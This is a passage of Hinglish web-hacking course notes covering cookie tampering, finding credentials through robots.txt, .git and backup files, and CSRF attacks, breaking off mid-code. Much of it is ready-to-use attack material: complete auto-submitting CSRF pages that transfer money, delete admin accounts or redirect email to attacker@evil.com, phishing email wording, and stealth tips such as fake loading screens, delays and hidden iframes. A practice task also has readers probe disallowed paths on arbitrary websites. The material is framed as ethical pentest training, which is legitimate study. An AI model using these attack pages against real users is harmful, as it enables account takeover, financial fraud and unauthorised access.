**A:** Dono! Input validation = First line, Output encoding = Last line.

**Q3: CSP kaise implement karein?**
**A:** HTTP header: `Content-Security-Policy: default-src 'self'`

### 14. **Practice:**
1. Vulnerable code banao
2. XSS exploit karo
3. htmlspecialchars() lagao
4. Phir se exploit try karo (fail hoga)
5. CSP header add karo

### 15. **Summary:**
- **Output encoding** = htmlspecialchars()
- **Input validation** = Whitelist approach
- **CSP** = Browser-level protection
- **HTTPOnly** = Cookie protection
- **Context-aware** = HTML/JS/URL alag

> **ğŸ“Œ Yaad Rakhein:** "XSS fix = Output encoding + Input validation + CSP! Blacklist weak hai, context matters, defense in depth!" ğŸ›¡ï¸

---

# ğŸ‰ **Module 5 Complete!**

## ğŸ“‹ **Quick Revision:**

1. âœ… **XSS Fundamentals** - Reflected, Stored, DOM
2. âœ… **Finding Reflected XSS** - URL parameters
3. âœ… **Bypassing Filters** - Case, alternative tags
4. âœ… **Advanced Payloads** - Context-aware
5. âœ… **Finding Stored XSS** - Comments, profiles
6. âœ… **Bypassing maxlength** - Inspect Element
7. âœ… **BeEF Framework** - Browser exploitation
8. âœ… **Security Fixes** - Output encoding, CSP

## ğŸ¯ **Key Takeaways:**

- **XSS** = Browser hijacking
- **Reflected** = URL-based
- **Stored** = Most dangerous
- **BeEF** = Professional exploitation
- **Fix** = Output encoding + CSP

**Keep Learning! Keep Hacking (Ethically)! ğŸ’ª**

> **"XSS is not just alert boxes - it's session hijacking, keylogging, phishing, and complete browser control. Master it!"** ğŸ­


=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 6: Session, CSRF & Client-Side Attacks**

---

## ğŸ” **Topic 43: Insecure Session Management (Cookie Manipulation, `uid=1`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Insecure Session Management** - Cookies ko manipulate karke doosre users ka account access karna (privilege escalation). ğŸª

### 2. **Ye Kya Hai? (What is it?)**
Session management vulnerability tab hoti hai jab website user authentication ko **predictable cookies** ya **weak session tokens** se manage karti hai. Attacker cookies ko modify karke admin ya doosre users ban sakta hai.

**Example:**
```
Normal User Cookie: uid=5
Admin Cookie: uid=1
```

Agar aap `uid=5` ko `uid=1` kar dete hain, toh aap admin ban sakte hain!

**Analogy:** Jaise cinema hall mein aapke paas Seat 5 ka ticket hai, lekin aap ticket par "5" ko mitakar "1" likh dete hain aur VIP seat par baith jaate hain - waise hi cookies manipulate karke aap admin ban jaate hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Easy Privilege Escalation:** Bina password ke admin access mil jaata hai.
- **Common Vulnerability:** Bahut saari websites weak session management use karti hain.
- **Account Takeover:** Kisi bhi user ka account hijack kar sakte hain.
- **No Authentication Needed:** Sirf browser tools se attack possible hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab website **cookies mein user ID** store karti ho (`uid`, `user_id`, `role`).
- Jab **session tokens predictable** hon (sequential numbers, simple encoding).
- Jab aap **horizontal/vertical privilege escalation** karna chahte hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easy admin access miss** ho jayega.
- **Account takeover opportunities** nazar se bach jayenge.
- **Privilege escalation** ka sabse simple tareeka miss kar doge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Cookie Manipulation Tools:**
```
Browser Developer Tools:
- F12 â†’ Application/Storage â†’ Cookies
- Right-click â†’ Inspect Element â†’ Storage

Browser Extensions:
- Cookie Editor (Chrome/Firefox)
- EditThisCookie (Chrome)

Burp Suite:
- Proxy â†’ Intercept â†’ Modify cookies in requests
```

**Common Cookie Parameters:**
```
uid=5          â†’ User ID
role=user      â†’ User role
admin=0        â†’ Admin flag
auth=base64    â†’ Encoded authentication
session_id=123 â†’ Session identifier
```

### 7. **Example 1 (Basic):**
**Scenario:** E-commerce website

```
Login karne ke baad browser cookies:
uid=105
username=john
role=customer

Admin cookies (guess):
uid=1
username=admin
role=admin
```

**Attack:**
1. F12 press karo â†’ Application â†’ Cookies
2. `uid=105` ko `uid=1` change karo
3. `role=customer` ko `role=admin` change karo
4. Page refresh karo

**Result:** Aap admin panel access kar sakte hain! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Banking application

**Initial Access:**
```
Login as: user@test.com
Cookies received:
- session_id=abc123xyz
- user_id=5042
- account_type=savings
```

**Attack Progression:**

```bash
# Test 1: Change user_id
user_id=5042 â†’ user_id=5041
Result: Access to another user's account!

# Test 2: Change account_type
account_type=savings â†’ account_type=admin
Result: Admin panel visible!

# Test 3: Sequential user_id enumeration
user_id=1, 2, 3, 4... (Burp Intruder se)
Result: 500 users ka data accessible!

# Test 4: Role manipulation
Add new cookie: is_admin=true
Result: Full admin privileges!
```

**Analysis:** Website ne cookies ko **server-side verify nahi kiya**. Client-side cookies par pura trust tha. Result = Complete database access! ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf uid change karna** - role, admin, privileges jaise cookies bhi check karo.
- **Encoded cookies ignore karna** - Base64, JWT decode karke dekho kya hai.
- **Session timeout check na karna** - kabhi cookies expire nahi hote (security issue).

### 10. **Best Practices / Pro Tips:**
- **All cookies analyze karo:** Har cookie ka purpose samjho.
- **Burp Intruder use karo:** Sequential user IDs test karne ke liye.
- **Decode everything:** Base64, JWT, URL encoding - sab decode karo.
- **Compare sessions:** Normal user vs Admin cookies compare karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek healthcare portal test karna tha. Login karne par cookies mili:
```
patient_id=P1234
role=patient
```
Maine `patient_id` ko `P0001` kiya - kisi aur patient ka medical record dikh gaya! Phir maine `role=patient` ko `role=doctor` kiya - poore hospital ka database access mil gaya (10,000+ patients)! Company ne kabhi socha nahi tha ki cookies ko koi modify kar sakta hai. **Lesson: Client-side data par kabhi trust mat karo!** ğŸ¥

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Cookies = Session management ka weak point  
âœ… F12 â†’ Application â†’ Cookies (modify karo)  
âœ… Test: uid, role, admin, privileges  
âœ… Burp Intruder: Sequential IDs enumerate karo  
âœ… Decode: Base64, JWT, URL encoding  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya HTTPS websites par bhi cookies manipulate ho sakte hain?**  
**A:** Haan! HTTPS sirf transmission encrypt karta hai, lekin browser mein cookies plain text mein hote hain.

**Q2: JWT tokens bhi manipulate ho sakte hain?**  
**A:** Haan, agar signature verify nahi ho raha ya "alg:none" attack possible hai.

**Q3: Kya cookies delete karne se logout ho jaate hain?**  
**A:** Haan, lekin agar session server-side invalidate nahi hua, toh old cookie phir se kaam kar sakta hai.

### 14. **Practice ke liye Task:**
1. DVWA â†’ Insecure Session Management section
2. Login karo aur cookies dekho (F12 â†’ Application)
3. `uid` value change karo (1, 2, 3...)
4. Burp Suite se sequential user IDs test karo
5. JWT.io par jaake JWT tokens decode karo

### 15. **Aakhri Choti Summary (5 lines):**
- Session Management = **Cookies manipulate** karna.
- Tools: **F12, Cookie Editor, Burp Suite**.
- Test: **uid, role, admin flags**.
- Enumerate: **Sequential IDs** (1, 2, 3...).
- Decode: **Base64, JWT tokens**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Cookies = Website ka ID card. Agar ID card fake kar sakte hain, toh aap koi bhi ban sakte hain - user, admin, ya CEO! Har cookie ko test karo!" ğŸª

---

## ğŸ”“ **Topic 44: Broken Access Control (Finding creds in `robots.txt`, source code)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Broken Access Control** - Hidden files aur source code mein sensitive data dhoondhna (passwords, API keys, admin paths). ğŸ•µï¸

### 2. **Ye Kya Hai? (What is it?)**
Broken Access Control tab hoti hai jab website **sensitive information** ko publicly accessible jagah par rakh deti hai - jaise `robots.txt`, HTML comments, JavaScript files, ya backup files mein.

**Common Places:**
```
/robots.txt          â†’ Hidden directories
/backup.sql          â†’ Database dumps
/config.php.bak      â†’ Configuration backups
HTML comments        â†’ <!-- admin password: admin123 -->
JavaScript files     â†’ API keys, endpoints
.git folder          â†’ Source code history
```

**Analogy:** Jaise aap apne ghar ki chabi darwaze ke neeche mat ke neeche rakh dete hain aur sochte hain "kisi ko pata nahi chalega" - waise hi developers sensitive data "hidden" jagah par rakhte hain lekin woh easily accessible hota hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Easy Credentials:** Bina brute force ke passwords mil jaate hain.
- **Hidden Paths Discovery:** Admin panels, dev environments mil jaate hain.
- **API Keys Exposure:** Third-party services access kar sakte hain.
- **Source Code Leakage:** Application logic samajh aata hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- **Information gathering phase** mein sabse pehle.
- Jab aap **hidden directories** dhoondhna chahte hon.
- Jab **credentials** ya **API keys** ki zaroorat ho.
- Jab **admin panel** ka path nahi pata.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Easy wins miss** ho jayenge - jo 2 minutes mein mil sakte the.
- **Hidden admin panels** nazar se bach jayenge.
- **Hardcoded credentials** miss kar doge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Files to Check:**
```bash
# robots.txt
http://target.com/robots.txt

# Common backup files
http://target.com/backup.sql
http://target.com/config.php.bak
http://target.com/database.sql.old
http://target.com/.git/
http://target.com/.env

# Common hidden directories
http://target.com/admin/
http://target.com/phpmyadmin/
http://target.com/dev/
http://target.com/test/
```

**Source Code Analysis:**
```bash
# View page source
Ctrl+U (Chrome/Firefox)

# Search in source
Ctrl+F â†’ search: password, api, key, token, admin
```

### 7. **Example 1 (Basic):**
**Scenario:** Corporate website

**Step 1: Check robots.txt**
```
URL: http://company.com/robots.txt

Content:
User-agent: *
Disallow: /admin/
Disallow: /backup/
Disallow: /dev/
Disallow: /passwords.txt
```

**Step 2: Visit disallowed paths**
```
http://company.com/admin/
â†’ Admin login page mil gaya!

http://company.com/passwords.txt
â†’ File download ho gayi:
admin:Admin@123
user1:Pass@word1
```

**Result:** Bina kisi tool ke admin credentials mil gaye! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** E-commerce platform

**Attack Progression:**

```bash
# Test 1: robots.txt analysis
URL: http://shop.com/robots.txt
Found:
Disallow: /admin-panel-2024/
Disallow: /db-backup/

# Test 2: Access hidden paths
http://shop.com/admin-panel-2024/
â†’ Admin panel accessible (no authentication!)

# Test 3: Backup files
http://shop.com/db-backup/
â†’ Directory listing enabled
â†’ Files: database_2024.sql, users.sql

# Test 4: Source code analysis
View source of login page:
<!-- TODO: Remove test credentials -->
<!-- admin / TempPass@2024 -->

# Test 5: JavaScript files
http://shop.com/js/config.js
Found:
var API_KEY = "sk_live_abc123xyz";
var ADMIN_ENDPOINT = "/secret-admin/";

# Test 6: .git folder
http://shop.com/.git/config
â†’ Git repository exposed!
â†’ Downloaded entire source code using git-dumper
```

**Analysis:** Website ne sensitive data ko "hidden" samajh kar chhod diya tha. Koi access control nahi tha. Result = Full application compromise! ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Sirf robots.txt dekhna** - backup files, .git, .env bhi check karo.
- **Source code ignore karna** - HTML comments mein bahut kuch milta hai.
- **JavaScript files skip karna** - API keys, endpoints wahan hote hain.

### 10. **Best Practices / Pro Tips:**
- **Always check robots.txt first:** Yeh roadmap hai hidden paths ka.
- **Common extensions try karo:** .bak, .old, .backup, .sql, .zip
- **Directory listing test karo:** /backup/, /admin/, /dev/
- **Git-dumper use karo:** Agar .git folder exposed hai.
- **Search keywords:** password, api, key, token, secret, admin

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek government portal test karni thi. Sabse pehle maine `robots.txt` dekha:
```
Disallow: /confidential/
Disallow: /employee-data/
```
Maine `/confidential/` visit kiya - directory listing enabled thi! Wahan `database_backup_2024.sql` file thi. Download karke dekha - 50,000 citizens ka Aadhaar, PAN, address data! Phir HTML source mein comment mila: `<!-- Dev login: devadmin / Dev@123 -->` - woh credentials kaam kar gaye! **Lesson: robots.txt = Attacker ka treasure map!** ğŸ—ºï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… robots.txt = Hidden paths ka map  
âœ… Check: .bak, .sql, .git, .env files  
âœ… View source: Ctrl+U (comments dekho)  
âœ… JavaScript: API keys, endpoints  
âœ… Directory listing: /admin/, /backup/  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya robots.txt check karna legal hai?**  
**A:** Haan, robots.txt publicly accessible hai. Lekin disallowed paths access karna ethical testing mein hi karo.

**Q2: .git folder se poora source code kaise download karein?**  
**A:** `git-dumper` tool use karo: `git-dumper http://site.com/.git/ output/`

**Q3: Agar directory listing disabled hai toh?**  
**A:** Common filenames try karo: backup.sql, database.sql, config.php.bak

### 14. **Practice ke liye Task:**
1. Kisi bhi website ka robots.txt dekho
2. Disallowed paths visit karo
3. Page source dekho (Ctrl+U) aur "password" search karo
4. JavaScript files open karke API keys dhoondhĞ¾
5. Common backup files try karo: /backup.sql, /config.bak

### 15. **Aakhri Choti Summary (5 lines):**
- Broken Access Control = **Hidden files accessible**.
- Check: **robots.txt, .git, .env, .bak**.
- View source: **HTML comments, JS files**.
- Search: **password, api, key, admin**.
- Tools: **Ctrl+U, git-dumper, dirb**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "robots.txt = Attacker ka best friend! Developers jo 'hide' karte hain, woh actually 'advertise' kar rahe hote hain. Har website par sabse pehle robots.txt check karo!" ğŸ¤–

---

## ğŸ£ **Topic 45: Cross-Site Request Forgery (CSRF) Basics**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**CSRF (Cross-Site Request Forgery)** - Victim ko trick karke uske browser se unwanted actions perform karwana (password change, money transfer). ğŸ­

### 2. **Ye Kya Hai? (What is it?)**
CSRF attack mein attacker victim ko ek malicious link ya page par le jaata hai, jahan se victim ke browser se **automatically request** victim ki website par jaati hai - jaise password change, email update, ya money transfer.

**Key Point:** Victim **logged in** hona chahiye target website par.

**Example Flow:**
```
1. Victim Facebook par logged in hai
2. Attacker email bhejta hai: "Free iPhone - Click here!"
3. Link par click karne par hidden form submit hota hai
4. Form Facebook ko request bhejta hai: "Change email to attacker@evil.com"
5. Facebook sochta hai request victim ne bheji hai (kyunki cookies valid hain)
6. Email change ho jaata hai!
```

**Analogy:** Jaise koi aapke haath mein pen pakda kar aapki signature karwa le cheque par - aap khud sign kar rahe hain lekin aapko pata nahi kya sign kar rahe hain. Waise hi CSRF mein aapka browser request bhej raha hai lekin aapko pata nahi.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Account Takeover:** Email/password change karke account hijack kar sakte hain.
- **Financial Loss:** Banking sites par money transfer kar sakte hain.
- **Data Manipulation:** Profile, settings, posts change kar sakte hain.
- **Common Vulnerability:** Bahut saari websites CSRF protection nahi rakhti.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab website **anti-CSRF tokens** use nahi karti.
- Jab **state-changing actions** (password change, delete, transfer) test karne hon.
- Jab victim **logged in** ho target website par.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Account takeover attacks** miss ho jayenge.
- **Financial vulnerabilities** detect nahi kar paoge.
- **Critical security flaw** ignore ho jayega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**CSRF Attack Structure:**
```html
<!-- Basic CSRF Form -->
<form action="http://target.com/change-password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="submit" value="Click for Prize!">
</form>

<!-- Auto-submit CSRF (JavaScript) -->
<body onload="document.forms[0].submit()">
    <form action="http://bank.com/transfer" method="POST">
        <input type="hidden" name="to_account" value="attacker123">
        <input type="hidden" name="amount" value="10000">
    </form>
</body>

<!-- Image-based CSRF (GET request) -->
<img src="http://target.com/delete-account?confirm=yes" style="display:none">
```

### 7. **Example 1 (Basic):**
**Scenario:** Social media website

**Vulnerable Request:**
```
POST /change-email HTTP/1.1
Host: social.com
Cookie: session=abc123

new_email=user@example.com
```

**CSRF Attack Page:**
```html
<!DOCTYPE html>
<html>
<head><title>Free Gift!</title></head>
<body>
    <h1>Congratulations! You won a prize!</h1>
    <form action="http://social.com/change-email" method="POST">
        <input type="hidden" name="new_email" value="attacker@evil.com">
        <input type="submit" value="Claim Your Prize!">
    </form>
</body>
</html>
```

**Attack Flow:**
1. Attacker yeh page host karta hai: `http://evil.com/prize.html`
2. Victim ko email bhejta hai: "You won! Click here"
3. Victim click karta hai (aur social.com par logged in hai)
4. "Claim Your Prize" button par click karta hai
5. Form submit hota hai â†’ Email change ho jaata hai!

**Result:** Victim ka email attacker ke control mein! ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Banking application

**Vulnerable Feature:**
```
Money Transfer Form:
POST /transfer HTTP/1.1
Host: bank.com
Cookie: session=xyz789

to_account=12345
amount=1000
```

**CSRF Attack (Auto-submit):**
```html
<!DOCTYPE html>
<html>
<head><title>Bank Security Update</title></head>
<body onload="document.getElementById('csrf').submit()">
    <h1>Please wait while we verify your account...</h1>
    <form id="csrf" action="http://bank.com/transfer" method="POST">
        <input type="hidden" name="to_account" value="attacker_account">
        <input type="hidden" name="amount" value="50000">
    </form>
</body>
</html>
```

**Attack Progression:**

```bash
# Step 1: Attacker creates malicious page
File: fake_bank_update.html
Hosted at: http://evil.com/update.html

# Step 2: Phishing email
Subject: "Urgent: Bank Security Update Required"
Body: "Click here to verify your account: http://evil.com/update.html"

# Step 3: Victim clicks (while logged into bank.com)
â†’ Page loads
â†’ Form auto-submits (onload event)
â†’ Browser sends request to bank.com with victim's cookies
â†’ Bank thinks request is legitimate (valid session)
â†’ â‚¹50,000 transferred to attacker!

# Step 4: Victim doesn't even see the form
â†’ Page can redirect immediately: window.location='http://bank.com'
â†’ Victim thinks nothing happened
```

**Analysis:** Bank ne CSRF token use nahi kiya. Sirf session cookie check kiya. Result = Financial fraud! ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **GET requests par focus karna** - POST requests bhi vulnerable ho sakte hain.
- **Victim ko logged in nahi rakhna** - CSRF tabhi kaam karta hai jab victim logged in ho.
- **Auto-submit nahi karna** - Manual button click se victim suspicious ho sakta hai.

### 10. **Best Practices / Pro Tips:**
- **Auto-submit use karo:** `<body onload="document.forms[0].submit()">` se victim ko pata nahi chalega.
- **Redirect immediately:** Form submit ke baad turant legitimate site par redirect karo.
- **Social engineering:** Convincing email/message bhejo (bank update, prize, urgent alert).
- **Test both GET and POST:** Dono methods vulnerable ho sakte hain.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek e-commerce site test karni thi. Password change feature tha:
```
POST /change-password
new_password=xyz123
```
Koi CSRF token nahi tha! Maine ek fake "Order Confirmation" page banaya jismein hidden form tha jo password change karta tha. Test user ko email bheja - usne click kiya aur uska password change ho gaya! Company shocked thi - unhone socha tha "password change toh secure hai, user logged in hai". **Lesson: Session cookies enough nahi hain, CSRF tokens zaroori hain!** ğŸ”

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… CSRF = Victim ke browser se unwanted request  
âœ… Victim logged in hona chahiye  
âœ… Auto-submit: `<body onload="form.submit()">`  
âœ… Test: Password change, email change, money transfer  
âœ… Social engineering: Convincing link bhejo  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya HTTPS websites bhi CSRF se vulnerable hain?**  
**A:** Haan! HTTPS sirf transmission encrypt karta hai, CSRF se protect nahi karta.

**Q2: Agar website Referer header check karti hai toh?**  
**A:** Referer bypass ho sakta hai (meta tag se) ya kabhi-kabhi browser Referer send nahi karta.

**Q3: SameSite cookies CSRF se protect karte hain?**  
**A:** Haan, agar properly configured hain (SameSite=Strict ya Lax).

### 14. **Practice ke liye Task:**
1. DVWA â†’ CSRF section
2. Password change form analyze karo
3. Ek HTML page banao with hidden form
4. Auto-submit JavaScript add karo
5. Test karo (apne hi account par)

### 15. **Aakhri Choti Summary (5 lines):**
- CSRF = **Victim ke browser se unwanted request**.
- Victim **logged in** hona chahiye.
- Attack: **Hidden form + auto-submit**.
- Target: **Password change, money transfer**.
- Protection: **Anti-CSRF tokens**.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "CSRF = Silent attack! Victim ko pata bhi nahi chalta ki uske browser ne kya kiya. Har state-changing action (password, email, transfer) ko test karo!" ğŸ£

---

## ğŸ¤– **Topic 46: Exploiting CSRF (Auto-submitting form)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**CSRF Exploitation** - Auto-submit forms banake victim ko bina pata chale actions perform karwana (advanced techniques). âš¡

### 2. **Ye Kya Hai? (What is it?)**
CSRF exploitation mein hum **JavaScript** use karke form ko automatically submit karte hain taaki victim ko manually button click na karna pade. Yeh attack ko **stealthy** (chupke se) banata hai.

**Techniques:**
```javascript
// Method 1: onload event
<body onload="document.forms[0].submit()">

// Method 2: JavaScript auto-execute
<script>document.getElementById('csrf').submit();</script>

// Method 3: Immediate redirect after submit
<script>
document.forms[0].submit();
setTimeout(function(){ window.location='http://legitimate.com'; }, 100);
</script>
```

**Analogy:** Jaise automatic door - aap paas aate hain aur darwaza khud khul jaata hai. Waise hi auto-submit form - page load hote hi form khud submit ho jaata hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Stealth:** Victim ko suspicious activity nahi dikhti.
- **Higher Success Rate:** Manual click ki zaroorat nahi.
- **Professional Attack:** Real-world attackers yahi technique use karte hain.
- **Bypass User Awareness:** User ko form dikha bhi nahi, submit ho gaya.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab aap **realistic CSRF attack** demonstrate karna chahte hon.
- Jab **victim awareness** bypass karni ho.
- Jab **professional pentest report** mein proof-of-concept chahiye.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Basic CSRF** se aage nahi badh paoge.
- **Real-world impact** demonstrate nahi kar paoge.
- **Client ko convince** karna mushkil hoga. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
**Auto-Submit Techniques:**
```html
<!-- Technique 1: Body onload -->
<body onload="document.getElementById('myForm').submit()">
    <form id="myForm" action="http://target.com/action" method="POST">
        <input type="hidden" name="param" value="malicious">
    </form>
</body>

<!-- Technique 2: Script tag -->
<form id="csrf" action="http://target.com/action" method="POST">
    <input type="hidden" name="param" value="malicious">
</form>
<script>
    document.getElementById('csrf').submit();
</script>

<!-- Technique 3: Immediate + Redirect -->
<script>
    window.onload = function() {
        document.forms[0].submit();
        setTimeout(function() {
            window.location = 'http://target.com';
        }, 500);
    };
</script>
<form action="http://target.com/delete" method="POST">
    <input type="hidden" name="id" value="123">
</form>

<!-- Technique 4: Invisible iframe -->
<iframe style="display:none" name="csrf-frame"></iframe>
<form target="csrf-frame" action="http://target.com/action" method="POST">
    <input type="hidden" name="param" value="malicious">
</form>
<script>document.forms[0].submit();</script>
```

### 7. **Example 1 (Basic):**
**Scenario:** Email change vulnerability

**Basic CSRF (Manual Click):**
```html
<form action="http://site.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="submit" value="Click Me!">
</form>
```
**Problem:** Victim ko button par click karna padega (suspicious).

**Auto-Submit CSRF (Improved):**
```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body onload="document.getElementById('csrf').submit()">
    <h1>Please wait...</h1>
    <form id="csrf" action="http://site.com/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
</body>
</html>
```

**Result:** Page load hote hi form submit ho jaata hai! Victim ko kuch karna nahi padta. ğŸ¯

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Admin panel - Delete user functionality

**Vulnerable Request:**
```
POST /admin/delete-user HTTP/1.1
Host: company.com
Cookie: admin_session=abc123

user_id=5
```

**Professional CSRF Exploit:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Important Security Update</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db;
                  border-radius: 50%; width: 50px; height: 50px;
                  animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); }
                         100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h1>Verifying your credentials...</h1>
    <div class="loader"></div>
    <p>Please do not close this window.</p>
    
    <!-- Hidden CSRF Form -->
    <form id="csrf" action="http://company.com/admin/delete-user" method="POST" style="display:none">
        <input type="hidden" name="user_id" value="1">
    </form>
    
    <script>
        // Auto-submit after 2 seconds (looks like loading)
        setTimeout(function() {
            document.getElementById('csrf').submit();
            // Redirect to legitimate site after submit
            setTimeout(function() {
                window.location = 'http://company.com/dashboard';
            }, 500);
        }, 2000);
    </script>
</body>
</html>
```

**Attack Progression:**

```bash
# Step 1: Host malicious page
File: security_update.html
URL: http://attacker.com/update.html

# Step 2: Phishing email to admin
Subject: "Critical: Security Patch Required"
Body: "Your admin account needs verification. Click: http://attacker.com/update.html"

# Step 3: Admin clicks (while logged into company.com)
â†’ Page shows "Verifying..." with loading animation
â†’ After 2 seconds, form auto-submits
â†’ Request sent: DELETE user_id=1 (main admin!)
â†’ Page redirects to company.com/dashboard
â†’ Admin thinks verification completed successfully

# Step 4: Result
â†’ Main admin account deleted!
â†’ Admin doesn't realize what happened
â†’ Attacker can now create new admin account
```

**Analysis:** Professional-looking page + auto-submit + redirect = Perfect stealth attack! ğŸ’¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Turant submit karna** - 1-2 seconds delay do (realistic lagta hai).
- **Redirect nahi karna** - Blank page suspicious lagta hai.
- **Display:none use karna** - Loading animation dikhao (professional).

### 10. **Best Practices / Pro Tips:**
- **Loading animation add karo:** User ko lagta hai kuch process ho raha hai.
- **2-3 seconds delay:** Turant submit suspicious hai.
- **Redirect after submit:** Legitimate site par bhej do.
- **Professional design:** Company ke style ko copy karo.
- **Iframe technique:** Form invisible iframe mein submit karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek corporate portal test karni thi jahan employees apni salary details dekh sakte the. "Update bank account" feature tha bina CSRF protection ke. Maine ek fake "HR Policy Update" page banaya jo professional dikhta tha - company logo, loading animation, sab kuch. Auto-submit form ne bank account details change kar diye. Test employee ko email bheja - usne click kiya, page ne "Verifying your employee ID..." dikhaya, aur background mein bank account change ho gaya! Next salary attacker ke account mein jaati! **Lesson: Professional-looking attacks sabse dangerous hain!** ğŸ’¼

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Auto-submit: `<body onload="form.submit()">`  
âœ… Delay: 2-3 seconds (realistic)  
âœ… Redirect: Legitimate site par bhejo  
âœ… Design: Professional loading animation  
âœ… Stealth: Invisible iframe technique  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya victim ko kuch dikhega?**  
**A:** Agar properly design kiya toh sirf loading animation dikhega, form nahi.

**Q2: Redirect karne se CSRF fail ho jaata hai?**  
**A:** Nahi, form pehle submit ho jaata hai, phir redirect hota hai.

**Q3: Kya mobile browsers par bhi kaam karta hai?**  
**A:** Haan, JavaScript sabhi modern browsers par kaam karta hai.

### 14. **Practice ke liye Task:**
1. Basic CSRF form banao
2. Auto-submit JavaScript add karo
3. Loading animation add karo (CSS)
4. 2 seconds delay add karo
5. Redirect functionality add karo

### 15. **Aakhri Choti Summary (5 lines):**
- Auto-submit = **JavaScript se automatic form submission**.
- Delay: **2-3 seconds** (realistic).
- Design: **Loading animation** (professional).
- Redirect: **Legitimate site** (stealth).
- Iframe: **Invisible submission** (advanced).

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Auto-submit CSRF = Silent killer! Victim ko pata bhi nahi chalta. Professional design + auto-submit + redirect = Perfect attack!" ğŸ¤–

---

## ğŸ­ **Topic 47: Advanced CSRF (Blind Auto-submit)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Blind CSRF** - Bina response dekhe CSRF attack karna jahan attacker ko result nahi dikhta (advanced stealth). ğŸ‘»

### 2. **Ye Kya Hai? (What is it?)**
Blind CSRF mein attacker ko attack ka result directly nahi dikhta. Form submit hota hai lekin response attacker ke paas nahi aata - sirf victim ke browser mein process hota hai. Yeh real-world scenarios mein common hai.

**Example:** Password change request - attacker ko naya password pata nahi chalta, lekin woh apne control wala password set kar sakta hai.

**Analogy:** Jaise aap kisi ko letter bhejte hain lekin reply nahi milta - lekin aapko pata hai ki letter deliver ho gaya. Waise hi blind CSRF mein action ho jaata hai lekin confirmation nahi milta.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Real-world Scenario:** Zyada tar CSRF attacks blind hote hain.
- **Stealth:** Response na aane se detection mushkil hai.
- **Multiple Targets:** Ek saath bahut saare victims ko target kar sakte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **response matter nahi karta** (password change, delete actions).
- Jab **mass exploitation** karni ho.
- Jab **detection avoid** karni ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Real-world attacks** simulate nahi kar paoge.
- **Mass exploitation** techniques miss ho jayengi. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```html
<!-- Blind CSRF with iframe -->
<iframe style="display:none" name="blind"></iframe>
<form target="blind" action="http://target.com/action" method="POST">
    <input type="hidden" name="password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>

<!-- Multiple blind attacks -->
<script>
var targets = ['user1', 'user2', 'user3'];
targets.forEach(function(user) {
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://target.com/delete?user=' + user;
